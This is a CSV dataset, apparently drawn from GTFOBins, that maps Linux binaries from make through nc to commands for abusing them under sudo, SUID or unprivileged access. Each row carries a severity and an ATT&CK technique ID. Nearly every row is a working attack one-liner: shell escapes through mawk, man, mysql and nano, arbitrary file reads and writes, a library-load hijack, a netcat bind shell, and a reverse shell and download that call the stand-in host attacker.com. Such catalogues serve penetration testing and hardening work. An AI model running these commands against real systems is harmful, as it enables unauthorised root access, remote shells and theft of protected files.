990,Linux,"make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .",Abuse the 'make' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/make/
991,Linux,"make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .",Abuse the 'make' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/make/
992,Linux,"make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .",Abuse the 'make' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/make/
993,Linux,"make -s --eval='$(file >/path/to/output-file,DATA)' .",Abuse the 'make' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/make/
994,Linux,"make -s --eval='$(file >/path/to/output-file,DATA)' .",Abuse the 'make' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/make/
995,Linux,"make -s --eval='$(file >/path/to/output-file,DATA)' .",Abuse the 'make' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/make/
996,Linux,make --eval='$(shell /bin/sh 1>&0)' .,Abuse the 'make' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/make/
997,Linux,make --eval='$(shell /bin/sh 1>&0)' .,Abuse the 'make' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/make/
998,Linux,make --eval='$(shell /bin/sh 1>&0)' .,Abuse the 'make' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/make/
999,Linux,man /path/to/input-file,Abuse the 'man' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is shown somehow formatted and displayed in the default pager.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/man/
1000,Linux,man /path/to/input-file,Abuse the 'man' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is shown somehow formatted and displayed in the default pager.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/man/
1001,Linux,man /path/to/input-file,Abuse the 'man' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is shown somehow formatted and displayed in the default pager.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/man/
1002,Linux,man man,Abuse the 'man' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/man/
1003,Linux,man man,Abuse the 'man' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/man/
1004,Linux,man man,Abuse the 'man' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/man/
1005,Linux,man '-H/bin/sh #' man,Abuse the 'man' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires GNU `troff` (`groff`) to be installed.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/man/
1006,Linux,man '-H/bin/sh #' man,Abuse the 'man' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This requires GNU `troff` (`groff`) to be installed.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/man/
1007,Linux,man '-H/bin/sh #' man,Abuse the 'man' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires GNU `troff` (`groff`) to be installed.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/man/
1008,Linux,mawk '//' /path/to/input-file,Abuse the 'mawk' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/mawk/
1009,Linux,mawk '//' /path/to/input-file,Abuse the 'mawk' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/mawk/
1010,Linux,mawk '//' /path/to/input-file,Abuse the 'mawk' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/mawk/
1011,Linux,"mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'mawk' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/mawk/
1012,Linux,"mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'mawk' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/mawk/
1013,Linux,"mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'mawk' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/mawk/
1014,Linux,"mawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'mawk' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mawk/
1015,Linux,"mawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'mawk' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/mawk/
1016,Linux,"mawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'mawk' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/mawk/
1017,Linux,minicom -D /dev/null,"Abuse the 'minicom' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/minicom/
1018,Linux,minicom -D /dev/null,"Abuse the 'minicom' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/minicom/
1019,Linux,minicom -D /dev/null,"Abuse the 'minicom' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/minicom/
1020,Linux,echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file minicom -D /dev/null -S /path/to/temp-file reset^J,"Abuse the 'minicom' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-A x`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/minicom/
1021,Linux,echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file minicom -D /dev/null -S /path/to/temp-file reset^J,"Abuse the 'minicom' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-A x`.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/minicom/
1022,Linux,echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file minicom -D /dev/null -S /path/to/temp-file reset^J,"Abuse the 'minicom' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-A x`.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/minicom/
1023,Linux,more /path/to/input-file,Abuse the 'more' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/more/
1024,Linux,more /path/to/input-file,Abuse the 'more' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/more/
1025,Linux,more /path/to/input-file,Abuse the 'more' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is displayed in the terminal interface.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/more/
1026,Linux,more /etc/hosts !/bin/sh,Abuse the 'more' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/more/
1027,Linux,more /etc/hosts !/bin/sh,Abuse the 'more' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/more/
1028,Linux,more /etc/hosts !/bin/sh,Abuse the 'more' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/more/
1029,Linux,mosh --server=mosh-server localhost /bin/sh,Abuse the 'mosh-server' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires a valid SSH access.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mosh-server/
1030,Linux,mosquitto -c /path/to/input-file,Abuse the 'mosquitto' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/mosquitto/
1031,Linux,mosquitto -c /path/to/input-file,Abuse the 'mosquitto' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/mosquitto/
1032,Linux,mosquitto -c /path/to/input-file,Abuse the 'mosquitto' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/mosquitto/
1033,Linux,mount -o bind /bin/sh /bin/mount mount,Abuse the 'mount' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This overrides `mount` itself with a shell (or any other executable).,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mount/
1034,Linux,msfconsole irb,Abuse the 'msfconsole' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msfconsole/
1035,Linux,msfconsole irb,Abuse the 'msfconsole' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/msfconsole/
1036,Linux,msgattrib -P /path/to/input-file,Abuse the 'msgattrib' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msgattrib/
1037,Linux,msgattrib -P /path/to/input-file,Abuse the 'msgattrib' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msgattrib/
1038,Linux,msgattrib -P /path/to/input-file,Abuse the 'msgattrib' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msgattrib/
1039,Linux,msgcat -P /path/to/input-file,Abuse the 'msgcat' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msgcat/
1040,Linux,msgcat -P /path/to/input-file,Abuse the 'msgcat' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msgcat/
1041,Linux,msgcat -P /path/to/input-file,Abuse the 'msgcat' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msgcat/
1042,Linux,msgconv -P /path/to/input-file,Abuse the 'msgconv' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msgconv/
1043,Linux,msgconv -P /path/to/input-file,Abuse the 'msgconv' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msgconv/
1044,Linux,msgconv -P /path/to/input-file,Abuse the 'msgconv' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msgconv/
1045,Linux,msgfilter -P -i /path/to/input-file /bin/cat,Abuse the 'msgfilter' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msgfilter/
1046,Linux,msgfilter -P -i /path/to/input-file /bin/cat,Abuse the 'msgfilter' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msgfilter/
1047,Linux,msgfilter -P -i /path/to/input-file /bin/cat,Abuse the 'msgfilter' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msgfilter/
1048,Linux,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"Abuse the 'msgfilter' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/msgfilter/
1049,Linux,echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID',"Abuse the 'msgfilter' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/msgfilter/
1050,Linux,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"Abuse the 'msgfilter' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/msgfilter/
1051,Linux,msgmerge -P /path/to/input-file /dev/null,Abuse the 'msgmerge' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msgmerge/
1052,Linux,msgmerge -P /path/to/input-file /dev/null,Abuse the 'msgmerge' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msgmerge/
1053,Linux,msgmerge -P /path/to/input-file /dev/null,Abuse the 'msgmerge' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msgmerge/
1054,Linux,msguniq -P /path/to/input-file,Abuse the 'msguniq' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/msguniq/
1055,Linux,msguniq -P /path/to/input-file,Abuse the 'msguniq' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/msguniq/
1056,Linux,msguniq -P /path/to/input-file,Abuse the 'msguniq' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed and displayed as a Java `.properties` file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/msguniq/
1057,Linux,mtr --raw -F /path/to/input-file,"Abuse the 'mtr' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed, thus the content is corrupted by error prints.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/mtr/
1058,Linux,mtr --raw -F /path/to/input-file,"Abuse the 'mtr' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed, thus the content is corrupted by error prints.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/mtr/
1059,Linux,multitime /bin/sh,Abuse the 'multitime' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/multitime/
1060,Linux,multitime /bin/sh -p,Abuse the 'multitime' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/multitime/
1061,Linux,multitime /bin/sh,Abuse the 'multitime' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/multitime/
1062,Linux,mutt -F /path/to/input-file,Abuse the 'mutt' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/mutt/
1063,Linux,mutt -F /path/to/input-file,Abuse the 'mutt' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/mutt/
1064,Linux,echo DATA >/path/to/temp-file mv /path/to/temp-file /path/to/output-file,Abuse the 'mv' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/mv/
1065,Linux,echo DATA >/path/to/temp-file mv /path/to/temp-file /path/to/output-file,Abuse the 'mv' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/mv/
1066,Linux,echo DATA >/path/to/temp-file mv /path/to/temp-file /path/to/output-file,Abuse the 'mv' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/mv/
1067,Linux,mv /path/to/input-file /path/to/output-file,Abuse the 'mv' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be used to move and then read or write files from a restricted file systems or with elevated privileges.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mv/
1068,Linux,mv /path/to/input-file /path/to/output-file,Abuse the 'mv' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be used to move and then read or write files from a restricted file systems or with elevated privileges.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/mv/
1069,Linux,mypy /path/to/input-file,Abuse the 'mypy' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Partial content is leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/mypy/
1070,Linux,mypy /path/to/input-file,Abuse the 'mypy' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Partial content is leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/mypy/
1071,Linux,mypy /path/to/input-file --junit-xml /path/to/output-file,Abuse the 'mypy' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Partial content is leaked as error messages inside some XML tags.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/mypy/
1072,Linux,mypy /path/to/input-file --junit-xml /path/to/output-file,Abuse the 'mypy' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Partial content is leaked as error messages inside some XML tags.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/mypy/
1073,Linux,mysql --default-auth ../../../../../path/to/lib,Abuse the 'mysql' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions. The following loads the `/path/to/lib.so` shared object.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/mysql/
1074,Linux,mysql --default-auth ../../../../../path/to/lib,Abuse the 'mysql' binary (library load) in a suid context to escalate privileges or execute arbitrary actions. The following loads the `/path/to/lib.so` shared object.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/mysql/
1075,Linux,mysql --default-auth ../../../../../path/to/lib,Abuse the 'mysql' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions. The following loads the `/path/to/lib.so` shared object.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/mysql/
1076,Linux,mysql -e '\! /bin/sh',Abuse the 'mysql' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mysql/
1077,Linux,mysql -e '\! /bin/sh',Abuse the 'mysql' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/mysql/
1078,Linux,mysql -e '\! /bin/sh',Abuse the 'mysql' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/mysql/
1079,Linux,nano /path/to/input-file,Abuse the 'nano' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is displayed in the terminal interface.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nano/
1080,Linux,nano /path/to/input-file,Abuse the 'nano' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is displayed in the terminal interface.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nano/
1081,Linux,nano /path/to/input-file,Abuse the 'nano' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is displayed in the terminal interface.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nano/
1082,Linux,nano /path/to/output-file DATA ^O,Abuse the 'nano' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nano/
1083,Linux,nano /path/to/output-file DATA ^O,Abuse the 'nano' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/nano/
1084,Linux,nano /path/to/output-file DATA ^O,Abuse the 'nano' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/nano/
1085,Linux,nano ^R^X reset; sh 1>&0 2>&0,Abuse the 'nano' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nano/
1086,Linux,nano ^R^X reset; sh 1>&0 2>&0,Abuse the 'nano' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nano/
1087,Linux,nano ^R^X reset; sh 1>&0 2>&0,Abuse the 'nano' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nano/
1088,Linux,nano -s /bin/sh /bin/sh ^T^T,Abuse the 'nano' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nano/
1089,Linux,nano -s '/bin/sh -p' /bin/sh -p ^T^T,Abuse the 'nano' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nano/
1090,Linux,nano -s /bin/sh /bin/sh ^T^T,Abuse the 'nano' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nano/
1091,Linux,nasm -@ /path/to/input-file,Abuse the 'nasm' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed throught error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nasm/
1092,Linux,nasm -@ /path/to/input-file,Abuse the 'nasm' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed throught error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nasm/
1093,Linux,nasm -@ /path/to/input-file,Abuse the 'nasm' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed throught error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nasm/
1094,Linux,nc -l -p 12345 -e /bin/sh,Abuse the 'nc' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nc/
1095,Linux,nc -l -p 12345 -e /bin/sh,Abuse the 'nc' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1096,Linux,nc -l -p 12345 -e /bin/sh,Abuse the 'nc' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/nc/
1097,Linux,nc -l -p 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nc/
1098,Linux,nc -l -p 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a suid context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1099,Linux,nc -l -p 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/nc/
1100,Linux,nc attacker.com 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nc/
1101,Linux,nc attacker.com 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a suid context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1102,Linux,nc attacker.com 12345 >/path/to/output-file,Abuse the 'nc' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually written by the invoking shell.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/nc/
1103,Linux,nc -e /bin/sh attacker.com 12345,Abuse the 'nc' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nc/
1104,Linux,nc -e /bin/sh attacker.com 12345,Abuse the 'nc' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1105,Linux,nc -e /bin/sh attacker.com 12345,Abuse the 'nc' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This only works with netcat traditional.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/nc/
1106,Linux,nc -l -p 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nc/
